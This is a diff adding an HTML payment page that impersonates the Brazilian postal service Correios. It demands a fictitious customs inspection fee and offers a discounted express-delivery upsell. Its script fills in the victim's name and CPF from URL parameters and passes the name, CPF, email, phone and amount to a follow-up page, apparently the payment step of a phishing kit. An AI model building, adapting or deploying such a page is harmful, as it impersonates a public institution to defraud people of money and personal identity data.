@@ -1,0 +1,140 @@
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Pagamento</title>
+
+    <link rel="shortcut icon" href="images/favi-ect.html">
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet ">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
+</head>
+
+<body class="">
+    <section id="acessibilidade">
+        <a tabindex="1">Acessibilidade</a>        
+    </section>
+
+    <section id="menu">
+        <a class="hamburger" tabindex="1"></a>
+        <a class="logo" href="#0"></a>
+        <a class="pesquisar"></a>
+        <a class="entrar" href="#0"></a>
+    </section>
+
+    <main>
+        <div class="container">
+            <nav aria-label="breadcrumb">
+                <div id="trilha">
+                    Portal Correios <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i></span> Rastreamento <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i> </span> Pagamento
+                </div>
+            </nav>
+
+            <div class="shadow-md mx-auto card-pagamento">
+                <div class="card-header bg-primary text-white text-center"></div>
+                <div class="card-body p-3">
+                    <div class="row mb-3 text-center">
+                        <p><b>Taxa de Fiscalização Aduaneira</b></p>
+                    </div>
+                    <div class="row mb-3">
+                        <p><b>NOME:</b> <span id="nome"></span></p>
+                    </div>
+                    <div class="row mb-3">
+                        <p><b>CPF:</b> <span id="cpf"></span></p>
+                    </div>
+                    <div class="row mb-3">
+                        <p><b>Taxa:</b><span id="taxa">R$ 45,89</span></p>
+                    </div>
+                    <section class="border-secondary mt-4">
+                        <div class="card-body border border-gray-300 p-4 mt-6 rounded-md bg-gray-50 shadow-md bg-gray-50">
+                            <div class="d-flex align-items-center">
+                                <img src="images/24hr.jpg" alt="Entrega Rápida" class="rounded me-3" style="width: 80px; height: 80px;">
+                                <div>
+                                    <h2 class="fs-3 fw-bold text-blue-600">SEDEX 24hrs</h2>
+                                    <p class="mb-1">Receba em até 24 horas</p>
+                                    <div class="d-flex align-items-center gap-2">
+                                        <span class="text-danger text-decoration-line-through">R$ 35,90</span>
+                                        <span class="fw-bold text-success" id="sedex">R$ 18,90</span>
+                                        <input type="hidden" name="valorTotal" id="valorTotal">
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="form-check mt-3">
+                                <input type="checkbox" id="pegar-oferta-checkbox" class="form-check-input">
+                                <label for="pegar-oferta-checkbox" class="form-check-label">RECEBER EM ATÉ 24HRS</label>
+                            </div>
+                        </div>
+                    </section>
+
+                    <a id="gerar-pagamento" href="#" class="btn btn-primary mt-4 w-100 bg-blue">Gerar pagamento</a>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    
+    <script src="js/bootstrap.js"></script>
+    <script src="js/bootstrap.bundle.min.js"></script><script>
+        $(document).ready(function () {
+            // Preencher os campos com os valores capturados da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const nome = urlParams.get("nome") || "Cliente";
+            const cpf = urlParams.get("cpf") || "Não informado";
+            const email = urlParams.get("email") || "Não informado";
+            const telefone = urlParams.get("telefone") || "Não informado";
+
+            // Corrige formatação do CPF se estiver sem pontos
+            const cpfFormatado = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
+
+            // Preencher na aba pagamento
+            document.getElementById("nome").textContent = nome;
+            document.getElementById("cpf").textContent = cpfFormatado;
+
+            // Armazena o valor original da taxa
+            const valorTaxaOriginal = 45.89;
+            const valorSedexOriginal = 18.90;
+
+            // Função para atualizar o valor total
+            function atualizarValorTotal() {
+                let valorTotal = valorTaxaOriginal;
+
+                if ($('#pegar-oferta-checkbox').is(':checked')) {
+                    valorTotal += valorSedexOriginal; // Adiciona o valor do SEDEX se selecionado
+                }
+
+                // Formata o valor para exibição (com vírgula como separador decimal)
+                let valorFormatado = valorTotal.toFixed(2).replace('.', ',');
+                
+                // Atualiza o valor total na tela
+                $('#valorTotal').val(valorFormatado);
+                $('#taxa').text('R$ ' + valorFormatado);
+            }
+
+            // Atualiza o valor total ao mudar o estado do checkbox
+            $('#pegar-oferta-checkbox').change(function () {
+                atualizarValorTotal();
+            });
+
+            // Inicializa o valor total
+            atualizarValorTotal();
+
+            $('#gerar-pagamento').click(function (e) {
+                e.preventDefault();
+                let valorTotal = $('#valorTotal').val();
+                
+                // Garante que o valor seja enviado no formato correto (com ponto como separador decimal)
+                let valorParaEnviar = valorTotal.replace(',', '.');
+
+                // Redireciona para a página taxa0738.html com o valor total
+                window.location.href = 'taxa0738.html?valor=' + valorParaEnviar + '&nome=' + encodeURIComponent(nome) + '&cpf=' + encodeURIComponent(cpf) + '&telefone=' + encodeURIComponent(telefone) + '&email=' + encodeURIComponent(email);
+            });
+        });
+    </script>
+
+</body>
+
+</html>
